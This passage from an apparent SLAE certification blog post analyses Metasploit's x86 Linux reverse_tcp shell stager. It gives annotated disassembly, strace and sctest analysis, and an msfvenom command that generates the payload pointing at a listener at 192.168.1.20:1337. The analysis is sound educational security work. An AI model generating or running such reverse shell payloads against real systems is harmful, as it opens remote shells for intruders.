</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span><span style=color:#177500></span><span style=color:#000>0000002</span><span style=color:#000>F</span>  <span style=color:#1c01ce>4</span><span style=color:#000>E</span>                <span style=color:#000>dec</span> <span style=color:#000>esi</span>                 <span style=color:#177500>; Decrease esi
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span><span style=color:#177500></span><span style=color:#000>00000030</span>  <span style=color:#000>743</span><span style=color:#000>D</span>              <span style=color:#000>jz</span> <span style=color:#1c01ce>0x6f</span>                 <span style=color:#177500>; If zero, exit program
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span><span style=color:#177500></span><span style=color:#000>00000032</span>  <span style=color:#000>68</span><span style=color:#000>A2000000</span>        <span style=color:#000>push</span> <span style=color:#000>dword</span> <span style=color:#1c01ce>0xa2</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span><span style=color:#000>00000037</span>  <span style=color:#000>58</span>                <span style=color:#000>pop</span> <span style=color:#000>eax</span>                 <span style=color:#177500>; syscall sys_nanosleep 162
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span><span style=color:#177500></span><span style=color:#000>00000038</span>  <span style=color:#000>6</span><span style=color:#000>A00</span>              <span style=color:#000>push</span> <span style=color:#000>byte</span> <span style=color:#000>+</span><span style=color:#1c01ce>0x0</span>          <span style=color:#177500>; timespec structure tv_nsec
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span><span style=color:#177500></span><span style=color:#000>0000003</span><span style=color:#000>A</span>  <span style=color:#1c01ce>6</span><span style=color:#000>A05</span>              <span style=color:#000>push</span> <span style=color:#000>byte</span> <span style=color:#000>+</span><span style=color:#1c01ce>0x5</span>          <span style=color:#177500>; timespec structure tv_sec -&gt; Sleep 5 seconds
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span><span style=color:#177500></span><span style=color:#000>0000003</span><span style=color:#000>C</span>  <span style=color:#1c01ce>89</span><span style=color:#000>E3</span>              <span style=color:#000>mov</span> <span style=color:#000>ebx</span>,<span style=color:#000>esp</span>             <span style=color:#177500>; ebx points to timespec structure
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span><span style=color:#177500></span><span style=color:#000>0000003</span><span style=color:#000>E</span>  <span style=color:#1c01ce>31</span><span style=color:#000>C9</span>              <span style=color:#000>xor</span> <span style=color:#000>ecx</span>,<span style=color:#000>ecx</span>             <span style=color:#177500>; last argument for sys_nanosleep is zero
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span><span style=color:#177500></span><span style=color:#000>00000040</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>                <span style=color:#177500>; Execute syscall
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span><span style=color:#177500></span><span style=color:#000>00000042</span>  <span style=color:#000>85</span><span style=color:#000>C0</span>              <span style=color:#000>test</span> <span style=color:#000>eax</span>,<span style=color:#000>eax</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span><span style=color:#000>00000044</span>  <span style=color:#000>79</span><span style=color:#000>BD</span>              <span style=color:#000>jns</span> <span style=color:#1c01ce>0x3</span>                 <span style=color:#177500>; if not zero jump to 00000003
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span><span style=color:#177500></span><span style=color:#000>00000046</span>  <span style=color:#000>EB27</span>              <span style=color:#000>jmp</span> <span style=color:#000>short</span> <span style=color:#1c01ce>0x6f</span>          <span style=color:#177500>; exit program
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span><span style=color:#177500></span><span style=color:#000>00000048</span>  <span style=color:#000>B207</span>              <span style=color:#000>mov</span> <span style=color:#000>dl</span>,<span style=color:#1c01ce>0x7</span>              <span style=color:#177500>; reverse shell success fully connected. 7 -&gt; read,write,execute
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span><span style=color:#177500></span><span style=color:#000>0000004</span><span style=color:#000>A</span>  <span style=color:#000>B900100000</span>        <span style=color:#000>mov</span> <span style=color:#000>ecx</span>,<span style=color:#1c01ce>0x1000</span>          <span style=color:#177500>; size_t len 4096
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span><span style=color:#177500></span><span style=color:#000>0000004</span><span style=color:#000>F</span>  <span style=color:#1c01ce>89</span><span style=color:#000>E3</span>              <span style=color:#000>mov</span> <span style=color:#000>ebx</span>,<span style=color:#000>esp</span>             <span style=color:#177500>; *addr = points to top of the stack
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span><span><span style=color:#177500></span><span style=color:#000>00000051</span>  <span style=color:#000>C1EB0C</span>            <span style=color:#000>shr</span> <span style=color:#000>ebx</span>,<span style=color:#1c01ce>0xc</span>             <span style=color:#177500>; shift ebx 12 bytes to the right
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span><span><span style=color:#177500></span><span style=color:#000>00000054</span>  <span style=color:#000>C1E30C</span>            <span style=color:#000>shl</span> <span style=color:#000>ebx</span>,<span style=color:#1c01ce>0xc</span>             <span style=color:#177500>; shift ebx 12 bytes to the left
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span><span style=color:#177500></span><span style=color:#000>00000057</span>  <span style=color:#000>B07D</span>              <span style=color:#000>mov</span> <span style=color:#000>al</span>,<span style=color:#1c01ce>0x7d</span>             <span style=color:#177500>; sys_mprotect 125
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span><span><span style=color:#177500></span><span style=color:#000>00000059</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>                <span style=color:#177500>; Execute syscall
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span><span><span style=color:#177500></span><span style=color:#000>0000005</span><span style=color:#000>B</span>  <span style=color:#1c01ce>85</span><span style=color:#000>C0</span>              <span style=color:#000>test</span> <span style=color:#000>eax</span>,<span style=color:#000>eax</span>            <span style=color:#177500>; Test if mprotect() returned success
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span><span><span style=color:#177500></span><span style=color:#000>0000005</span><span style=color:#000>D</span>  <span style=color:#1c01ce>7810</span>              <span style=color:#000>js</span> <span style=color:#1c01ce>0x6f</span>                 <span style=color:#177500>; If zero, exit program
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span><span><span style=color:#177500></span><span style=color:#000>0000005</span><span style=color:#000>F</span>  <span style=color:#1c01ce>5</span><span style=color:#000>B</span>                <span style=color:#000>pop</span> <span style=color:#000>ebx</span>                 <span style=color:#177500>; file descriptor for read()
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53</span><span><span style=color:#177500></span><span style=color:#000>00000060</span>  <span style=color:#000>89</span><span style=color:#000>E1</span>              <span style=color:#000>mov</span> <span style=color:#000>ecx</span>,<span style=color:#000>esp</span>             <span style=color:#177500>; move stack pointer to ecx = void *buf
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54</span><span><span style=color:#177500></span><span style=color:#000>00000062</span>  <span style=color:#000>99</span>                <span style=color:#000>cdq</span>                     <span style=color:#177500>; 
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55</span><span><span style=color:#177500></span><span style=color:#000>00000063</span>  <span style=color:#000>B224</span>              <span style=color:#000>mov</span> <span style=color:#000>dl</span>,<span style=color:#1c01ce>0x24</span>             <span style=color:#177500>; size_t count = 36 bytes
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56</span><span><span style=color:#177500></span><span style=color:#000>00000065</span>  <span style=color:#000>B003</span>              <span style=color:#000>mov</span> <span style=color:#000>al</span>,<span style=color:#1c01ce>0x3</span>              <span style=color:#177500>; sys_read 03
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57</span><span><span style=color:#177500></span><span style=color:#000>00000067</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>                <span style=color:#177500>; Execute syscall
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58</span><span><span style=color:#177500></span><span style=color:#000>00000069</span>  <span style=color:#000>85</span><span style=color:#000>C0</span>              <span style=color:#000>test</span> <span style=color:#000>eax</span>,<span style=color:#000>eax</span>            <span style=color:#177500>; Test if read() returned success
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59</span><span><span style=color:#177500></span><span style=color:#000>0000006</span><span style=color:#000>B</span>  <span style=color:#1c01ce>7802</span>              <span style=color:#000>js</span> <span style=color:#1c01ce>0x6f</span>                 <span style=color:#177500>; If not zero, exit program
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60</span><span><span style=color:#177500></span><span style=color:#000>0000006</span><span style=color:#000>D</span>  <span style=color:#000>FFE1</span>              <span style=color:#000>jmp</span> <span style=color:#000>ecx</span>                 <span style=color:#177500>; Loop back to ecx
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61</span><span><span style=color:#177500></span><span style=color:#000>0000006</span><span style=color:#000>F</span>  <span style=color:#000>B801000000</span>        <span style=color:#000>mov</span> <span style=color:#000>eax</span>,<span style=color:#1c01ce>0x1</span>             <span style=color:#177500>; sys_exit 01
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62</span><span><span style=color:#177500></span><span style=color:#000>00000074</span>  <span style=color:#000>BB01000000</span>        <span style=color:#000>mov</span> <span style=color:#000>ebx</span>,<span style=color:#1c01ce>0x1</span>             <span style=color:#177500>; Set return value to error
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63</span><span><span style=color:#177500></span><span style=color:#000>00000079</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>                <span style=color:#177500>; Execute syscall
</span></span></span></code></pre></div><p>Compared to other common reverse shell payloads, this one is a little bit different because it performs error checking after each syscall. If an error is detected, simply exit the program. In addition to error checking, it contains a few other features as well. The program will try to connect 10 times before it exits. Between each connection attempt it will also sleep for 5 seconds. Once a connection has been made, <code>mprotect()</code> is called marking the top of the stack readable, writable and executable for the process&rsquo;s memory pages.</p><p>We can dynamically analyse the payload using <code>strace</code> to see which system calls are being made. Because this payload expects shellcode as input, I simply used metasploit&rsquo;s <code>exploit/multi/handler</code> to listen for connections. The image below shows <code>strace</code> on the left and metasploit on the right.</p><p><img src=reverse_shell_tcp.png alt=reverse_shell_tcp.png></p><p>The green line shows the shellcode received from metasploit. Following the <code>strace</code> output, we can see that the shellcode performs an <code>execve()</code> syscall, executing <code>/bin/sh</code> and finally running the command <code>id</code>, sent from metasploit&rsquo;s terminal.</p><p>Another tool we can use for analyzing shellcode is <a href=https://www.aldeid.com/wiki/Libemu/sctest>sctest</a> which can be used for emulating shellcode. Running the following commands will create a graphical image showing which syscalls are being made.</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ msfvenom -p linux/x86/shell/reverse_tcp -a x86 --platform linux lhost=192.168.1.20 lport=1337 -f raw | ~/SLAE/libemu/tools/sctest/sctest -vvv -Ss 100000 -G reverse_tcp.dot
dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ dot reverse_tcp.dot -Tpng -o reverse_tcp.png
</code></pre><p>The generated image:</p><center><img src=reverse_tcp.png alt="reverse tcp with sctest"></center><p>In addition to generating images, <code>sctest</code> will also generate some C code based on the structures used by each syscall. For example, the C code below corresponds to creating a <code>socket</code> and then calling the <code>connect</code> syscall. We can also see the configured port and IP address.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#a90d91>int</span> <span style=color:#000>socket</span> (
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>     <span style=color:#a90d91>int</span> <span style=color:#000>domain</span> <span style=color:#000>=</span> <span style=color:#1c01ce>2</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>     <span style=color:#a90d91>int</span> <span style=color:#000>type</span> <span style=color:#000>=</span> <span style=color:#1c01ce>1</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>     <span style=color:#a90d91>int</span> <span style=color:#000>protocol</span> <span style=color:#000>=</span> <span style=color:#1c01ce>0</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>) <span style=color:#000>=</span>  <span style=color:#1c01ce>14</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#a90d91>int</span> <span style=color:#000>connect</span> (
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>     <span style=color:#a90d91>int</span> <span style=color:#000>sockfd</span> <span style=color:#000>=</span> <span style=color:#1c01ce>14</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>     <span style=color:#a90d91>struct</span> <span style=color:#000>sockaddr_in</span> <span style=color:#000>*</span> <span style=color:#000>serv_addr</span> <span style=color:#000>=</span> <span style=color:#1c01ce>0x00416fbe</span> <span style=color:#000>=&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>         <span style=color:#a90d91>struct</span>   <span style=color:#000>=</span> {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>             <span style=color:#a90d91>short</span> <span style=color:#000>sin_family</span> <span style=color:#000>=</span> <span style=color:#1c01ce>2</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>             <span style=color:#a90d91>unsigned</span> <span style=color:#a90d91>short</span> <span style=color:#000>sin_port</span> <span style=color:#000>=</span> <span style=color:#1c01ce>14597</span> (<span style=color:#000>port</span><span style=color:#000>=</span><span style=color:#1c01ce>1337</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>             <span style=color:#a90d91>struct</span> <span style=color:#000>in_addr</span> <span style=color:#000>sin_addr</span> <span style=color:#000>=</span> {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>                 <span style=color:#a90d91>unsigned</span> <span style=color:#a90d91>long</span> <span style=color:#000>s_addr</span> <span style=color:#000>=</span> <span style=color:#1c01ce>335653056</span> (<span style=color:#000>host</span><span style=color:#000>=</span><span style=color:#1c01ce>192.168.1.20</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>             };
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>             <span style=color:#a90d91>char</span> <span style=color:#000>sin_zero</span> <span style=color:#000>=</span> <span style=color:#c41a16>&#34;       &#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>         };
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>     <span style=color:#a90d91>int</span> <span style=color:#000>addrlen</span> <span style=color:#000>=</span> <span style=color:#1c01ce>102</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>) <span style=color:#000>=</span>  <span style=color:#1c01ce>0</span>;
</span></span></code></pre></div><p>That&rsquo;s it, this was a fun payload to dissect :)</p><hr><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: SLAE-1490</p></div></div></div></article></div><div class=row><footer></footer></div></div><script src=/js/bootstrap.min.js async></script><script src=/js/main.js defer async></script></body></html>